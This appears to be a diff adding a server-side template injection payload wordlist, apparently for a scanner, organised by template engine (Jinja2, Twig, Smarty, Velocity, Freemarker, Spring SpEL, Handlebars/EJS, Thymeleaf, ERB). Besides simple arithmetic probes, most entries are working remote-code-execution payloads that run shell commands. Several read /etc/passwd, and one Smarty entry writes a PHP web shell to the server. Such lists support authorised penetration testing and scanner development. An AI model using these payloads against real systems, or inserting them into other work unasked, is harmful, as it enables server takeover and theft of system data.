@@ -1,0 +1,139 @@
+# category: ssti
+# description: Server-side template injection — Jinja2/Twig/Mustache/Smarty/ERB/EL/Velocity/Handlebars/Freemarker.
+# references: PortSwigger SSTI Research, PayloadsAllTheThings SSTI.
+
+{{7*7}}
+{{7*'7'}}
+{{7+7}}
+{{ 7 * 7 }}
+{{ "".__class__ }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{ config }}
+{{ config.items() }}
+{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
+{{ ''.__class__.__mro__[-1].__subclasses__() }}
+{{ request }}
+{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
+{{ ''.__class__.__mro__[2].__subclasses__()[59]()._module.__builtins__['__import__']('os').popen('id').read() }}
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ lipsum.__globals__['os'].popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ url_for.__globals__['__builtins__']['open']('/etc/passwd').read() }}
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c()._module.__builtins__['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}
+{% debug %}
+{% if config %}{{ config }}{% endif %}
+{{ 7*'7' }}
+${7*7}
+${{7*7}}
+#{7*7}
+*{7*7}
+@{7*7}
+@(7*7)
+%{7*7}
+{{= 7*7 }}
+<%= 7*7 %>
+<%= system('id') %>
+<%= File.open('/etc/passwd').read %>
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.System).getenv()}
+${T(java.lang.ProcessBuilder).new('id').start()}
+${(#rt = @java.lang.Runtime@getRuntime()).(#rt.exec('id'))}
+${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}
+${pageContext.request.getServerInfo()}
+${session}
+${applicationScope}
+#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("exec",[Ljava.lang.String;).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),["id"])
+{{= it.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString() }}
+{{this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}
+<%= 7*7 %>
+<%= @instance_variable %>
+<%=session[:user]%>
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+{{@root.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}
+{{%22safe%22|safe}}
+{{''.join([chr(x) for x in [105,100]])}}
+{{ 'a'|upper }}
+{{ 'abc'.encode('rot13') }}
+#set($str = $class.inspect("java.lang.String"))
+*{{3*3}}
+{{= user.name }}
+{{ [].class.name }}
+[% USE Dumper; Dumper.dump({x=>1}) %]
+[% x = 1 %][% x %]
+[[${7*7}]]
+
+# ── Jinja2 deeper ─────────────────────────────────────────────────────────
+{{ ''.__class__.__base__.__subclasses__() }}
+{{ ''.__class__.mro()[-1].__subclasses__() }}
+{{ request.application.__self__._get_data_for_json }}
+{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate() }}
+{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['sys'].modules['os'].popen('id').read() }}
+{% set x = request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() %}{{x}}
+{{ request['application']['__globals__']['__builtins__']['eval']('__import__("os").popen("id").read()') }}
+{{ config|attr('from_object')('os') }}
+
+# ── Twig (PHP) deeper ─────────────────────────────────────────────────────
+{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}
+{{ ['id']|filter('system') }}
+{{ ['id']|map('system') }}
+{{ ['id']|sort('system') }}
+{{ ['/etc/passwd']|map('file_get_contents') }}
+{{ 'id'|filter('system') }}
+
+# ── Mako / Tornado / Smarty / Velocity ────────────────────────────────────
+<%import os%>${os.popen('id').read()}
+${include('/etc/passwd')}
+<%!import os%>${os.system('id')}
+{{ handler.settings }}
+{{ handler.application.settings }}
+{% import os %}{{ os.popen('id').read() }}
+{self::getStreamVariable('php://input')}
+{php}system('id');{/php}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php system($_GET["c"]);?>',$smarty)}
+#set($x=$class.inspect("java.lang.Runtime"))
+#set($rt=$x.getMethod("getRuntime").invoke(null,null))
+$rt.exec("id")
+#foreach($i in [1..1])${Runtime.getRuntime().exec("id")}#end
+#set($str = $class.inspect("java.lang.String"))
+
+# ── Freemarker ────────────────────────────────────────────────────────────
+<#assign classloader=newclass("org.springframework.cglib.core.ReflectUtils").class.classLoader>
+<#assign owc=newclass("freemarker.template.utility.ObjectConstructor")>
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign x="freemarker.template.utility.ObjectConstructor"?new()>${x("java.lang.ProcessBuilder",["id"]).start()}
+<#assign x=object?api.class.protectionDomain.classLoader.loadClass("java.lang.Runtime")?api.getMethod("getRuntime",null)?api.invoke(null,null)>${x.exec("id")}
+
+# ── Spring SpEL (deep) ────────────────────────────────────────────────────
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}
+${new java.lang.ProcessBuilder(new String[]{'id'}).start()}
+${new java.util.Scanner(new java.lang.ProcessBuilder('id').start().getInputStream()).next()}
+${T(org.springframework.util.StreamUtils).copyToString(T(Runtime).getRuntime().exec('id').getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))}
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+
+# ── Node (Handlebars/Pug/EJS) ─────────────────────────────────────────────
+#{this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}
+{{#with "s" as |s|}}{{#with (lookup s.sub "constructor")}}{{#with (.apply .. "return process.mainModule.require('child_process').execSync('id').toString()")}}{{this}}{{/with}}{{/with}}{{/with}}
+<%= global.process.mainModule.require('child_process').execSync('id') %>
+<%- global.process.mainModule.require('child_process').execSync('id') %>
+<%% x=process.mainModule.require('child_process').execSync('id') %%>
+
+# ── Thymeleaf ──────────────────────────────────────────────────────────────
+__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+<th:text="${T(java.lang.Runtime).getRuntime().exec('id')}">x
+*{T(java.lang.Runtime).getRuntime().exec('id')}
+
+# ── Ruby ERB / Slim ────────────────────────────────────────────────────────
+<%= `id` %>
+<%= File.open('/etc/passwd').read %>
+<%= Kernel.system('id') %>
+<%= eval 'File.read("/etc/passwd")' %>
+<%= require 'open3'; Open3.capture2('id') %>
+#{`id`}
+#{File.read('/etc/passwd')}
